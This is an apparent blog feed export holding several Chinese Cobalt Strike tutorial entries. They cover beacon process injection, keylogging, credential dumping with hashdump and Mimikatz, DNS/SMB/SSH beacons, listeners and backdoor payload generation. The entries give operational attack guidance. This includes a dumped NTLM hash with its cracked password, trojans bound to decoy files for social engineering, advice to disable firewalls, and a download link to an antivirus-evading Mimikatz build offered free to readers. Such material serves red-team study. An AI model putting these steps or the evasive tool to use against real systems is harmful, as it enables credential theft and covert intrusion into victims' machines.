title="②进程注入"></a>②进程注入</h3><p>该功能可以把你的beacon会话注入到另外一个程序之中，注入后，及时你原来的后门进程被关闭，你依然可以手握目标机的权限<br><a href="https://imgchr.com/i/eM84Hg"><img src="https://s2.ax1x.com/2019/07/27/eM84Hg.png" alt="eM84Hg.png"></a><br>选择进程，点击inject，随后选择监听器，点击choose，即可发现Cobaltstrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon</p><h3 id="③键盘记录"><a href="#③键盘记录" class="headerlink" title="③键盘记录"></a>③键盘记录</h3><p>选择好进程后(可ctrl多选)，点击Log Keystrokes，然后再点击菜单栏上的“键盘记录”按钮<br><a href="https://imgchr.com/i/eM8IEQ"><img src="https://s2.ax1x.com/2019/07/27/eM8IEQ.png" alt="eM8IEQ.png"></a></p><p>如图，成功get到目标机的键盘记录</p><p><a href="https://imgchr.com/i/eM8oNj"><img src="https://s2.ax1x.com/2019/07/27/eM8oNj.png" alt="eM8oNj.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(五)凭据导出</title>
      <link href="/2019/06/11/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%BA%94-%E5%87%AD%E6%8D%AE%E5%AF%BC%E5%87%BA/"/>
      <url>/2019/06/11/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%BA%94-%E5%87%AD%E6%8D%AE%E5%AF%BC%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-凭据导出"><a href="#0x01-凭据导出" class="headerlink" title="0x01-凭据导出"></a>0x01-凭据导出</h2><p>凭据说的通俗易懂一点，可以理解为目标机的账号，密码<br>凭据导出是渗透测试中即为重要的步骤，导出目标机凭据后，我们可以使用凭据实现横向移动（利用hash传递，smb&#x2F;rdp爆破等等手法）来扩大我们的战果</p><h2 id="0x02-Hashdump导出hash"><a href="#0x02-Hashdump导出hash" class="headerlink" title="0x02-Hashdump导出hash"></a>0x02-Hashdump导出hash</h2><p><a href="https://imgchr.com/i/eMeKdP"><img src="https://s2.ax1x.com/2019/07/27/eMeKdP.png" alt="eMeKdP.png"></a><br>选择beacon会话右键,选择执行–&gt;转储Hash，或在beacon中输入hashdump<br>如图beacon会话框输出了目标机的用户名和密码hash值<br>以本次导出的一个凭据为例</p><pre><code>admin:1022:aad3b435b51404eeaad3b435b51404ee:f4bb18c1165a89248f9e853b269a8995:::</code></pre><p>f4bb18c1165a89248f9e853b269a8995为admin用户的NTLM Hash<br>我们可以去cmd5等平台破解该NTLM密文，如图，破解后明文为Abc123<br><a href="https://imgchr.com/i/eMe1JS"><img src="https://s2.ax1x.com/2019/07/27/eMe1JS.png" alt="eMe1JS.png"></a></p><h2 id="0x003-Mimikatz导出凭据"><a href="#0x003-Mimikatz导出凭据" class="headerlink" title="0x003-Mimikatz导出凭据"></a>0x003-Mimikatz导出凭据</h2><p><a href="https://imgchr.com/i/eMeuZt"><img src="https://s2.ax1x.com/2019/07/27/eMeuZt.png" alt="eMeuZt.png"></a></p><p>选择执行–&gt;Run Mimikatz，或在beacon中执行logonpasswords命令当会话为管理员权限时，才能dump成功，如果权限很低，请先提权~我日后也会写</p><p>如图，成功导出了登陆过3389的某用户的明文密码</p><p><a href="https://imgchr.com/i/eMedoV"><img src="https://s2.ax1x.com/2019/07/27/eMedoV.png" alt="eMedoV.png"></a></p><h2 id="0x04–凭据存储"><a href="#0x04–凭据存储" class="headerlink" title="0x04–凭据存储"></a>0x04–凭据存储</h2><p>如图，点击按钮，即可查看之前dump过的凭据信息<br><a href="https://imgchr.com/i/eMe8zQ"><img src="https://s2.ax1x.com/2019/07/27/eMe8zQ.png" alt="eMe8zQ.png"></a><br>在进行横向移动时也可以使用之前dump过的凭据<br><a href="https://imgchr.com/i/eMe3Rg"><img src="https://s2.ax1x.com/2019/07/27/eMe3Rg.png" alt="eMe3Rg.png"></a></p><h2 id="0x05-大福利"><a href="#0x05-大福利" class="headerlink" title="0x05-大福利"></a>0x05-大福利</h2><p>什么?你的mimikatz被杀了？加载不出来？？<br><a href="https://imgchr.com/i/eMeMIf"><img src="https://s2.ax1x.com/2019/07/27/eMeMIf.png" alt="eMeMIf.png"></a><br>今天为博客朋友们免费送上自改免杀版mimikatz，支持Windows10，编译时默认功能为logonpasswords</p><p><a href="https://imgchr.com/i/eMeJMj"><img src="https://s2.ax1x.com/2019/07/27/eMeJMj.png" alt="eMeJMj.png"></a><br>链接：<a href="https://pan.baidu.com/s/183BozwOrNNKurWOB-Gw74A">https://pan.baidu.com/s/183BozwOrNNKurWOB-Gw74A</a><br>提取码：3k84</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(四)菜单栏与视图</title>
      <link href="/2019/06/10/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%9B%9B-%E8%8F%9C%E5%8D%95%E6%A0%8F%E4%B8%8E%E8%A7%86%E5%9B%BE/"/>
      <url>/2019/06/10/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%9B%9B-%E8%8F%9C%E5%8D%95%E6%A0%8F%E4%B8%8E%E8%A7%86%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Cobaltstrike菜单栏"><a href="#0x01-Cobaltstrike菜单栏" class="headerlink" title="0x01-Cobaltstrike菜单栏"></a>0x01-Cobaltstrike菜单栏</h2><p><a href="https://imgchr.com/i/eKTD29"><img src="https://s2.ax1x.com/2019/07/27/eKTD29.png" alt="eKTD29.png"></a></p><pre><code>1.新建连接2.断开当前连接3.监听器4.改变视图为Pivot Graph(可以显示各个目标的关系)5.改变视图为Session Table(会话列表)6.改变视图为Target Table(目标列表)7.查看凭据信息8.查看文件下载9.查看键盘记录10.查看屏幕截图11.生成无状态Beacon后门12.java自签名程序攻击13.生成office宏后门14.生成脚本通过web传递(利用powershell，bitsadmin，regsvr32生成会话)15.在Cobalt Strike的web服务上托管一个文件(提供一个文件下载)16.管理Cobalt Strike上运行的web服务17.帮助18.关于</code></pre><h2 id="0x02-Cobaltstrike视图"><a href="#0x02-Cobaltstrike视图" class="headerlink" title="0x02-Cobaltstrike视图"></a>0x02-Cobaltstrike视图</h2><h3 id="①菜单4-Pivot-Graph-拓扑图"><a href="#①菜单4-Pivot-Graph-拓扑图" class="headerlink" title="①菜单4:Pivot Graph(拓扑图)"></a>①菜单4:Pivot Graph(拓扑图)</h3><p>如图所示，该视图可以很清楚地查看各主机之间的关系，该视图在大规模内网渗透和APT中非常直观和实用。<br><a href="https://imgchr.com/i/eKTcb6"><img src="https://s2.ax1x.com/2019/07/27/eKTcb6.png" alt="eKTcb6.png"></a></p><h3 id="②菜单5-Session-Table-会话列表"><a href="#②菜单5-Session-Table-会话列表" class="headerlink" title="②菜单5:Session Table(会话列表)"></a>②菜单5:Session Table(会话列表)</h3><p>这个视图是我们渗透测试中最为常用的，他主要显示的是当前所有的会话，会话的权限，会话运行在目标机上的pid等等<br>选择会话右键，会出现很多功能</p><pre><code>进入beacon执行        dump hashes 获取hash        Elevate  提权        Golden Ticket 生成黄金票据注入当前会话        MAke token  凭证转换        Run Mimikatz 运行 Mimikatz         Spawn As 用其他用户生成Cobalt Strike侦听器目标        Browser Pivot 劫持目标浏览器进程        Desktop(VNC)  桌面交互        File Browser  文件浏览器        Net View 命令Net View        Port scan 端口扫描        Process list 进程列表        Screenshot 截图中转        SOCKS Server 代理服务        Listener  反向端口转发        Deploy VPN 部署VPNSpawn  新的通讯模式并生成会话Session 会话管理，删除，心跳时间，退出，备注</code></pre><p><a href="https://imgchr.com/i/eKTyK1"><img src="https://s2.ax1x.com/2019/07/27/eKTyK1.png" alt="eKTyK1.png"></a></p><h3 id="③菜单6-Target-Table-目标列表"><a href="#③菜单6-Target-Table-目标列表" class="headerlink" title="③菜单6:Target Table(目标列表)"></a>③菜单6:Target Table(目标列表)</h3><p>  本处显示的是在beacon中执行主机存活扫描&#x2F;端口扫描后，探测出的存活的主机。<br><a href="https://imgchr.com/i/eKT6Dx"><img src="https://s2.ax1x.com/2019/07/27/eKT6Dx.png" alt="eKT6Dx.png"></a></p><p>  在本视图中，选择目标右键<br><a href="https://imgchr.com/i/eKTrvR"><img src="https://s2.ax1x.com/2019/07/27/eKTrvR.png" alt="eKTrvR.png"></a></p><p>   如图，cs可以使用多种方式登录到目标主机（进行内网横向移动），如果多台服务器使用了同样的凭据，我们就可以使用此功能进行hash传递，拿下多台服务器权限<br>当然，其也带有端口扫描功能，可以扫描指定主机的端口。</p><p><a href="https://imgchr.com/i/eKT2VK"><img src="https://s2.ax1x.com/2019/07/27/eKT2VK.png" alt="eKT2VK.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(三)beacon详解</title>
      <link href="/2019/06/09/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%89-beacon%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/06/09/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%89-beacon%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Beacon详解"><a href="#0x01-Beacon详解" class="headerlink" title="0x01-Beacon详解"></a>0x01-Beacon详解</h2><h3 id="1-Beacon命令"><a href="#1-Beacon命令" class="headerlink" title="1.Beacon命令"></a>1.Beacon命令</h3><p>大家通过系列教程(二)的学习，配置好Listner，让目标机执行我们的Payload&#x2F;后门程序后，即可发现目标机已经上线<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZqk8%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZqk8.png" alt="eKZqk8.png"></a><br>右键目标interact来使用Beacon，我们用它来执行各种命令<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZOfg%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZOfg.png" alt="eKZOfg.png"></a></p><p>※在Cobalt Strike中它的心跳默认是60s(即sleep时间为60s，每一分钟目标主机与teamserver通信一次)， 这会让我们执行命令或进行其他操作响应很慢。。。<br>我刚开始没设置sleep时间甚至以为是cobaltstrike坏了–||。如果sleep时间过长，在下载文件面前更为明显，所以在测试时会把时间降低一点 。所以拿到beacon我一般先执行sleep 5，大家可以根据实战环境来调节，建议不要太快，不然流量会很明显。<br><img src="https://s2.ax1x.com/2019/07/27/eKmbRg.png" alt="eKmbRg.png"><br>※注意：beacon中不能直接输入cmd命令，比如要让目标机执行ipconfig这条cmd命令，对应的beacon命令是shell ipconfig,新人不要在这里踩坑哈<br>其他的beacon命令，大家可以在beacon中输入help来获取~<br>我在这贴出一部分汉化的命令</p><pre><code>Beacon Commands    Command                   Description    -------                   -----------    browserpivot              注入受害者浏览器进程    bypassuac                 绕过UAC    cancel                    取消正在进行的下载    cd                        切换目录    checkin                   强制让被控端回连一次    clear                     清除beacon内部的任务队列    connect                   Connect to a Beacon peer over TCP    covertvpn                 部署Covert VPN客户端    cp                        复制文件    dcsync                    从DC中提取密码哈希    desktop                   远程VNC    dllinject                 反射DLL注入进程    dllload                   使用LoadLibrary将DLL加载到进程中    download                  下载文件    downloads                 列出正在进行的文件下载    drives                    列出目标盘符    elevate                   尝试提权    execute                   在目标上执行程序(无输出)    execute-assembly          在目标上内存中执行本地.NET程序    exit                      退出beacon    getprivs                  Enable system privileges on current token    getsystem                 尝试获取SYSTEM权限    getuid                    获取用户ID    hashdump                  转储密码哈希值    help                      帮助    inject                    在特定进程中生成会话    jobkill                   杀死一个后台任务    jobs                      列出后台任务    kerberos_ccache_use       从ccache文件中导入票据应用于此会话    kerberos_ticket_purge     清除当前会话的票据    kerberos_ticket_use       从ticket文件中导入票据应用于此会话    keylogger                 键盘记录    kill                      结束进程    link                      Connect to a Beacon peer over a named pipe    logonpasswords            使用mimikatz转储凭据和哈希值    ls                        列出文件    make_token                创建令牌以传递凭据    mimikatz                  运行mimikatz    mkdir                     创建一个目录    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)    mode http                 使用HTTP作为通信通道    mv                        移动文件    net                       net命令    note                      备注           portscan                  进行端口扫描    powerpick                 通过Unmanaged PowerShell执行命令    powershell                通过powershell.exe执行命令    powershell-import         导入powershell脚本    ppid                      Set parent PID for spawned post-ex jobs    ps                        显示进程列表    p**ec                    Use a service to spawn a session on a host    p**ec_psh                Use PowerShell to spawn a session on a host    psinject                  在特定进程中执行PowerShell命令    pth                       使用Mimikatz进行传递哈希    pwd                       当前目录位置    reg                       Query the registry    rev2self                  恢复原始令牌    rm                        删除文件或文件夹    rportfwd                  端口转发    run                       在目标上执行程序(返回输出)    runas                     以另一个用户权限执行程序    runasadmin                在高权限下执行程序    runu                      Execute a program under another PID    screenshot                屏幕截图    setenv                    设置环境变量    shell                     cmd执行命令    shinject                  将shellcode注入进程    shspawn                   生成进程并将shellcode注入其中    sleep                     设置睡眠延迟时间    socks                     启动SOCKS4代理    socks stop                停止SOCKS4    spawn                     Spawn a session     spawnas                   Spawn a session as another user    spawnto                   Set executable to spawn processes into    spawnu                    Spawn a session under another PID    ssh                       使用ssh连接远程主机    ssh-key                   使用密钥连接远程主机    steal_token               从进程中窃取令牌    timestomp                 将一个文件时间戳应用到另一个文件    unlink                    Disconnect from parent Beacon    upload                    上传文件    wdigest                   使用mimikatz转储明文凭据    winrm                     使用WinRM在主机上生成会话    wmi                       使用WMI在主机上生成会话    argue                      进程参数欺骗</code></pre><h3 id="2-多种beacon"><a href="#2-多种beacon" class="headerlink" title="2.多种beacon"></a>2.多种beacon</h3><p>以下beacon使用前均需要开启对应的Listener，Listener如何开启请看上一节</p><h3 id="①http-beacon-amp-tcp-beacon"><a href="#①http-beacon-amp-tcp-beacon" class="headerlink" title="①http beacon&amp;tcp beacon"></a>①http beacon&amp;tcp beacon</h3><p>这两种beacon都是比较普通的，个人感觉讲解的意义不是很大。只不过是主机与teamserver的通信协议不同而已。<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZHTf%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZHTf.png" alt="eKZHTf.png"></a></p><h3 id="②SMB-beacon"><a href="#②SMB-beacon" class="headerlink" title="②SMB beacon"></a>②SMB beacon</h3><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h4><p>官网介绍:SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。<br>因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。<br>这张图很好的诠释了SMB beacon的工作流程<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZLtS%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZLtS.png" alt="eKZLtS.png"></a></p><h4 id="②smb-beacon使用"><a href="#②smb-beacon使用" class="headerlink" title="②smb beacon使用"></a>②smb beacon使用</h4><p>※这种beacon要求具有SMB Beacon的主机必须接受端口445上的连接.<br>派生一个SMB Beacon方法：在Listner生成SMB Beacon&gt;目标主机&gt;右键&gt; spawn as&gt;选中对应的Listener&gt;上线<br>或在beacon中使用命令spawn smb（smb为我的smb listener名字）<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZjpQ%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZjpQ.png" alt="eKZjpQ.png"></a><br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZvlj%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZvlj.png" alt="eKZvlj.png"></a></p><p>运行成功后外部可以看到∞∞这个字符，这就是派生的SMB Beacon。<br>当前是连接状态，你可以Beacon上用link <ip>命令链接他或者unlink <ip>命令断开它。<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZx6s%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZx6s.png" alt="eKZx6s.png"></a></p><p>这种beacon在内网横向渗透中运用的很多，横向渗透留到日后再讲。在内网环境中可以使用ipc $生成的SMB Beacon上传到目标主机执行，但是目标主机并不会直接上线的，需要我们自己用链接命令(link <ip>)去连接他。 </p><h3 id="③DNS-Beacon"><a href="#③DNS-Beacon" class="headerlink" title="③DNS Beacon"></a>③DNS Beacon</h3><p>DNS Beacon 在绕过防火墙 权限维持上非常有效，DNS beacon 可谓是是最受欢迎的Cobalt Strike功能之一。 官网给出的原理示意图如下<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZ70P%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZ70P.png" alt="eKZ70P.png"></a><br>使用DNS Beacon首先的有一个域名，域名建议用国外的，省去一些不必要的麻烦，也防止被查水表。。。域名使用一些通用平常的即可，整个配置过程配置非常简单一条A记录和几条NS记录即可</p><p>首先进入到域名管理界面（自己的域名过期了，用一下404师傅的图）<br>配置A记录指向服务器ip –&gt;ns记录都指向A记录域名<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZ56A%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZ56A.png" alt="eKZ56A.png"></a></p><p>配置好了我们可以用 nslookup 或者 dig +trace 来测试下 是否成功<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZ4ld%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZ4ld.png" alt="eKZ4ld.png"></a><br>如果返回的IP地址与你的服务器ip地址对应是正确的，那我们就可以开始配置dns beacon的监听器了<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKuqDs%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKuqDs.png" alt="eKuqDs.png"></a></p><p>Host那里最好填域名（A记录解析那个），不要填服务器的ip地址<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZhSH%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZhSH.png" alt="eKZhSH.png"></a><br>然后确定填上ns记录 英文逗号隔开 ，然后生成后门测试效果<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKubuj%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKubuj.png" alt="eKubuj.png"></a><br>这是主机栏上出现了一个黑屏的logo，经过一段时间的等待，目标主机即可上线。</p><h3 id="④SSH-beacon"><a href="#④SSH-beacon" class="headerlink" title="④SSH beacon"></a>④SSH beacon</h3><p>当内网有Linux时Cobalt Strike也是考虑到的提供了ssh连接，大家可以通过metasploit爆破内网的ssh账号密码，然后用目标机的beacon去连接就可以了。<br>目前有两种SSH Beacon连接方法<br><strong>1.密码直接连接</strong><br>Beacon命令: ssh [target:port] [user] [pass]<br><strong>2.ssh密匙连接</strong><br>ssh [target:port] [user] [&#x2F;path&#x2F;to&#x2F;key.pem]<br>链接成功后，如图会出现一个子beacon<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZIOI%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZIOI.png" alt="eKZIOI.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(二)Listner与Payload生成</title>
      <link href="/2019/06/08/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%BA%8C-Listner%E4%B8%8EPayload%E7%94%9F%E6%88%90/"/>
      <url>/2019/06/08/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%BA%8C-Listner%E4%B8%8EPayload%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00-前言"></a>0x00-前言</h2><p>PS:原本想完成日更目标的，但昨天在研究无线，就没更，今天加班~<br><img src="https://s2.ax1x.com/2019/07/27/euTJyt.png" alt="euTJyt.png"></p><h2 id="0x01-Listner-监听器-介绍"><a href="#0x01-Listner-监听器-介绍" class="headerlink" title="0x01-Listner(监听器)介绍"></a>0x01-Listner(监听器)介绍</h2><h3 id="①Cobaltstrike-listner简介"><a href="#①Cobaltstrike-listner简介" class="headerlink" title="①Cobaltstrike listner简介"></a>①Cobaltstrike listner简介</h3><p>可能有一些小白并不理解什么叫做listner，在此科普一下。<br>Listner(监听器):专门用于对其他对象身上发生的事件或状态改变进行监听和相应处理的对象,当被监视的对象发生情况时,立即采取相应的行动。<br>在许多的渗透测试工具中，例如empire，metasploit，cobaltstrike中都有listner的存在。大家可以简单地理解为listner就是用来接收目标主机权限的模块。<br><img src="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211220201742456-2098877481.png" alt="image"></p><p>创建Listener的步骤：Cobaltstrike–&gt;监听器<br>目前我是用的是Cobaltstrike3.13版本，其中内置了九个Listener<br><a href="https://imgchr.com/i/euT8SA"><img src="https://s2.ax1x.com/2019/07/27/euT8SA.png" alt="euT8SA.png"></a></p><pre><code>windows/beacon_dns/reverse_dns_txtwindows/beacon_dns/reverse_httpwindows/beacon_tcp/bind_tcpwindows/beacon_http/reverse_httpwindows/beacon_https/reverse_httpswindows/beacon_smb/bind_pipe windows/foreign/reverse_http windows/foreign/reverse_https windows/foreign/reverse_tcp</code></pre><p>beacon为cs内置监听器,也就是说,当我们在目标系统成功执行payload以后,会弹回一个beacon的shell给cs<br>foreign主要是提供给外部使用的一些监听器,比如你想利用cs派生一个meterpreter或者armitage的shell回来,来继续后面的内网渗透,这时就选择使用外部监听器<br>至于如何实现Cobaltstrike与MSF和Armitage的联动，我们日后再讲。</p><h3 id="②listener的配置"><a href="#②listener的配置" class="headerlink" title="②listener的配置"></a>②listener的配置</h3><p>选择Cobaltstrike–&gt;监听器<br>随后输入Listener名字并选择你要使用的Listner类型，配置好外网IP和端口(不能冲突)点击save即可保存。在以后生成Payload的过程中即可使用该监听器。<br><a href="https://imgchr.com/i/euTZsx"><img src="https://s2.ax1x.com/2019/07/27/euTZsx.png" alt="euTZsx.png"></a></p><h2 id="0x002-Cobaltstrike生成后门"><a href="#0x002-Cobaltstrike生成后门" class="headerlink" title="0x002-Cobaltstrike生成后门"></a>0x002-Cobaltstrike生成后门</h2><h3 id="①Payload概念"><a href="#①Payload概念" class="headerlink" title="①Payload概念"></a>①Payload概念</h3><p>Payload在渗透测试之中大家可以简单地理解为一段漏洞利用&#x2F;植入后门的代码或程序。</p><h3 id="②Cobaltstrike生成后门"><a href="#②Cobaltstrike生成后门" class="headerlink" title="②Cobaltstrike生成后门"></a>②Cobaltstrike生成后门</h3><p>攻击–&gt;生成后门<br><a href="https://imgchr.com/i/euTGQI"><img src="https://s2.ax1x.com/2019/07/27/euTGQI.png" alt="euTGQI.png"></a><br>今天我们来讲红框中的四个生成后门的方式，其余的比较特殊，留作日后单独讲解。</p><h3 id="1-Payload-Generator"><a href="#1-Payload-Generator" class="headerlink" title="1.Payload Generator"></a>1.Payload Generator</h3><p>该模块可以生成n中语言的后门Payload，包括C,C#,Python,Java,Perl,Powershell脚本，Powershell命令，Ruby,Raw，免杀框架Veli中的shellcode等等…个人感觉这是CS的一个很大的迷人之处。<br><a href="https://imgchr.com/i/euTVQ1"><img src="https://s2.ax1x.com/2019/07/27/euTVQ1.png" alt="euTVQ1.png"></a><br>在渗透Windows主机过程中，我用的比较多的就是Powershell和Powershell Command，主要是因为其方便易用，且可以逃避一下杀毒软件（AV）的查杀。<br>以Powershell Command为例，生成的payload为一串命令，只要在主机上执行这一串命令（主机需安装Powershell），cs即可收到主机的beacon<br><a href="https://imgchr.com/i/euTudO"><img src="https://s2.ax1x.com/2019/07/27/euTudO.png" alt="euTudO.png"></a><br>其他语言的Payload，大家请自己研究~</p><h3 id="2-Windows-Dropper"><a href="#2-Windows-Dropper" class="headerlink" title="2.Windows Dropper"></a>2.Windows Dropper</h3><p>这个是一个windows程序的捆绑器，他可以实现把后门捆绑于其他程序之上，比如扫雷游戏，某些带有诱惑性的可执行文件…<br>个人感觉这种攻击方式结合社工来一同应用往往会发挥奇效~<br><a href="https://imgchr.com/i/euTneK"><img src="https://s2.ax1x.com/2019/07/27/euTneK.png" alt="euTneK.png"></a><br>在本处，我捆绑的文件为nidongde.txt，生成的后门名为dropper.exe<br>点击dropper.exe执行后，释放出了nidongde.txt文件，同时CS也收到了会话。<br><img src="https://s2.ax1x.com/2019/07/27/euTBWj.png" alt="euTBWj.png"></p><h3 id="3-Windows-Excutable-x2F-Windows-Excutable-s"><a href="#3-Windows-Excutable-x2F-Windows-Excutable-s" class="headerlink" title="3.Windows Excutable&#x2F;Windows Excutable(s)"></a>3.Windows Excutable&#x2F;Windows Excutable(s)</h3><h4 id="①Windows-Excutable生成的后门是Windows可执行文件，如exe，DLL"><a href="#①Windows-Excutable生成的后门是Windows可执行文件，如exe，DLL" class="headerlink" title="①Windows Excutable生成的后门是Windows可执行文件，如exe，DLL"></a>①Windows Excutable生成的后门是Windows可执行文件，如exe，DLL</h4><p><a href="https://imgchr.com/i/euTKoD"><img src="https://s2.ax1x.com/2019/07/27/euTKoD.png" alt="euTKoD.png"></a><br>exe文件运行后，CS即可收到目标主机的会话。<br>至于DLL大家可以使用针对DLL的相关攻击手法，这个我日后会写文章专门来讲</p><h4 id="②Windows-Excutable带有生成出的是stageless版本（无状态Windows后门木马），下面简单说下这个无状态木马的使用方法。一般使用无状态木马的网络环境是这样的"><a href="#②Windows-Excutable带有生成出的是stageless版本（无状态Windows后门木马），下面简单说下这个无状态木马的使用方法。一般使用无状态木马的网络环境是这样的" class="headerlink" title="②Windows Excutable带有生成出的是stageless版本（无状态Windows后门木马），下面简单说下这个无状态木马的使用方法。一般使用无状态木马的网络环境是这样的"></a>②Windows Excutable带有生成出的是stageless版本（无状态Windows后门木马），下面简单说下这个无状态木马的使用方法。一般使用无状态木马的网络环境是这样的</h4><p><a href="https://imgchr.com/i/euTQFe"><img src="https://s2.ax1x.com/2019/07/27/euTQFe.png" alt="euTQFe.png"></a></p><p>首先你需要让一台主机作为中转器，配合无状态木马使用</p><p><a href="https://imgchr.com/i/euTlJH"><img src="https://s2.ax1x.com/2019/07/27/euTlJH.png" alt="euTlJH.png"></a></p><p>这里选择中转器的监听器生成木马。需要注意–如果开启了防火墙会产生一个Windows安全警报。因此最好提前用cmd添加一个防火墙放行规则或关闭防火墙，随后便可将无状态的木马上传到内网的其他机器运行后返回一个会话</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(一)简介与安装</title>
      <link href="/2019/06/07/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%80-%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/"/>
      <url>/2019/06/07/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%80-%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Cobaltstrike简介"><a href="#0x01-Cobaltstrike简介" class="headerlink" title="0x01-Cobaltstrike简介"></a>0x01-Cobaltstrike简介</h2><p>Cobalt Strike是一款美国Red Team开发的渗透测试神器，常被业界人称为CS。这款神器许多大佬们都已经玩的很6，我一个菜鸡玩的略有心得，因此写一下自己的Cobaltstrike系列文章，希望给各位一点帮助。<br>最近这个工具大火，成为了渗透测试中不可缺少的利器。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱。<br>项目官网:<a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a><br><a href="https://imgchr.com/i/eV6shQ"><img src="https://s2.ax1x.com/2019/07/24/eV6shQ.png" alt="eV6shQ.png"></a><br>话说这个工具的社区版是大家熟知的Armitage(一个MSF的图形化界面工具)，而Cobaltstrike大家可以理解其为Armitage的商业版。<br><img src="https://s2.ax1x.com/2019/07/24/eVcS4e.png" alt="eVcS4e.png"><br>早期版本CobaltSrtike依赖Metasploit框架，而现在Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端(Client)与服务端(Teamserver)，服务端是一个，客户端可以有多个，团队可进行分布式协团操作。<br><a href="https://imgchr.com/i/eVcPgA"><img src="https://s2.ax1x.com/2019/07/24/eVcPgA.png" alt="eVcPgA.png"></a></p><h2 id="0x02-Cobaltstrike架构"><a href="#0x02-Cobaltstrike架构" class="headerlink" title="0x02-Cobaltstrike架构"></a>0x02-Cobaltstrike架构</h2><p>本人使用的是Cabaltstrike3.13版本，虽然官方已经更新到3.14版本，但是我发现3.14版本并不稳定，因此不推荐使用<br>3.13版本文件架构如下。</p><p>│  Scripts 用户安装的插件<br>│  Log 每天的日志<br>│  c2lint  检查profile的错误异常<br>│  cobaltstrike<br>│  cobaltstrike.jar 客户端程序<br>│  icon.jpg      LOGO<br>│  license.pdf  许可证文件<br>│  readme.txt<br>│  